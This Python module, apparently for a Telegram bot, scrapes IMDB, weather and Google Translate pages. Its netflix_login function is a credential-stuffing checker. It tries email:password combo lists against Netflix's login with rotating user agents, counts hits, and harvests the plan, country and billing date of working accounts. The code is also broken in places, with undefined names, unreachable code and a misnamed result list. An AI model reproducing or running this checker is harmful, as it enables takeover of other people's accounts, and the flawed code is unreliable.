from urllib.parse import quote

from bs4 import BeautifulSoup
from requests import Session, get, post


def get_imdb_title_with_keyword(keyword: str):
    """Get IMDB title with keyword"""
    url = "https://www.imdb.com/find?ref_=nv_sr_fn&q={}&s=tt".format(keyword)
    response = get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    result = soup.find("td", {"class": "result_text"})
    if result:
        return result.a.attrs["href"].split("/")[2]
    return "No results found"


def get_imdb_soup(keyword: str):
    """Get IMDB soup"""
    imdb_id = get_imdb_title_with_keyword(keyword)
    url = "https://www.imdb.com/title/{}/".format(imdb_id)
    response = get(url)
    return BeautifulSoup(response.text, "html.parser")


def get_weather(city: str):
    """Get weather from openweathermap.org"""
    url = "https://www.timeanddate.com/scripts/completion.php"
    params = {"xd": 21, "query": city, "mode": "ci"}
    response = get(url, params=params)
    if response.text == "":
        return "City not found"
    print(response.text)
    url = "https://www.timeanddate.com" + response.text.split("/ext")[0]
    response = get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    weather = soup.find("div", {"id": "qlook"})
    data = weather.find_all("p")
    stat = data[0].text
    info = str(data[1]).split("<br/>")
    details = [x.text for x in soup.find(class_="bk-focus__info").find_all("td")]
    result = (
        "<b>Weather in <code>{}</code></b>\n\n".format(city)
        + "<b>Temperature:</b> <code>{}</code>\n".format(
            weather.find("div", {"class": "h2"}).text
        )
        + "<b>Status:</b> {}\n".format(stat)
        + "<b>Feels like:</b> <code>{}</code>\n".format(info[0].split(": ")[1])
        + "<b>Forecast:</b> <code>{}</code>\n".format(
            info[1].split(": ")[1].split("<")[0]
        )
        + "<b>Wind:</b> <code>{}</code>\n".format(info[2].split(": ")[1].split("<")[0])
        + "<b>Location:</b> {}\n".format(details[0])
        + "<b>Current Time:</b> <code>{}</code>\n".format(details[1])
        + "<b>Latest Update:</b> <code>{}</code>\n".format(details[2])
        + "<b>Visibility:</b> {}\n".format(details[3])
        + "<b>Pressure:</b> <code>{}</code>\n".format(details[4])
        + "<b>Humidity:</b> <code>{}</code>\n".format(details[5])
        + "<b>Dew Point:</b> <code>{}</code>\n".format(details[6])
        + "\n<b>🎉 @MissValeri_Bot</b>"
    )
    return result


def translate(text, to_lang="en"):
    # https://translate.google.com/translate_a/single?dj=1&q=bye&sl=en&tl=ja&hl=en-US&ie=UTF-8&oe=UTF-8&client=at&dt=t&dt=ld&dt=qca&dt=rm&dt=bd&dt=md&dt=ss&dt=ex&dt=sos&otf=2
    # change API to above one
    # add exampld, synonym etc
    url = "https://www.google.com/async/translate?vet=12ahUKEwiM3pvpx8z1AhV_SmwGHRb5C5MQqDh6BAgDECY..i&ei=EL_vYYyWFP-UseMPlvKvmAk&client=opera&yv=3"
    data = f"async=translate,sl:auto,tl:{to_lang},st:{quote(text)},id:1643102010421,qc:true,ac:true,_id:tw-async-translate,_pms:s,_fmt:pc"
    headers = {
        "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/83.0.4254.19",
    }
    request = post(url, data=data, headers=headers)
    soup = BeautifulSoup(request.text, "html.parser")
    result = soup.find("span", {"id": "tw-answ-target-text"})
    return result.text if result else "vision.google.api returned err."


def netflix_login(combos):
    hits = 0
    bad = 0
    result = []
    for combo in combos:
        client = Session()
        login = client.get(
            "https://www.netflix.com/login", headers={"User-Agent": ua().random}
        )
        soup = BeautifulSoup(login.text, "html.parser")
        loginForm = soup.find("form")
        authURL = loginForm.find("input", {"name": "authURL"}).get("value")
        headers = {
            "user-agent": ua().random,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": "https://www.netflix.com/login",
            "content-type": "application/x-www-form-urlencoded",
            "cookie": "",
        }
        data = {
            "userLoginId:": combo.split(":")[0],
            "password": combo.split(":")[1],
            "rememberMeCheckbox": "true",
            "flow": "websiteSignUp",
            "mode": "login",
            "action": "loginAction",
            "withFields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode",
            "authURL": authURL,
            "nextPage": "https://www.netflix.com/browse",
            "countryCode": "+1",
            "countryIsoCode": "US",
        }

        request = client.post(
            "https://www.netflix.com/login",
            headers=headers,
            data=data,
        )
        cookie = dict(
            flwssn=client.get(
                "https://www.netflix.com/login", headers={"User-Agent": ua().random}
            ).cookies.get("flwssn")
        )

        if (
            "Sorry, we can't find an account with this email address. Please try again or"
            in request.text
        ):
            bad += 1
            print("No email.")
        elif "Incorrect password" in request.text:
            bad += 1
            print("Incorrect pass.")

        else:
            print(requests.text)
            return
            info = client.get(
                "https://www.netflix.com/YourAccount",
                headers={
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Connection": "keep-alive",
                    "Host": "www.netflix.com",
                    "Referer": "https://www.netflix.com/browse",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-User": "?1",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
                },
                cookies=cookie,
                timeout=10,
            ).text

            plan = (
                info.split('data-uia="plan-label"><b>')[1].split("</b>")[0]
                if len(info.split('data-uia="plan-label"><b>')) > 1
                else "null"
            )
            country = info.split('","currentCountry":"')[1].split('"')[0]
            expiry = info.split('data-uia="nextBillingDate-item">')[1].split("<")[0]
            hits += 1
            results.append(
                {
                    "email": combo.split(":")[0],
                    "password": combo.split(":")[1],
                    "plan": plan,
                    "country": country,
                    "expiry": expiry,
                }
            )
    return result, hits, bad
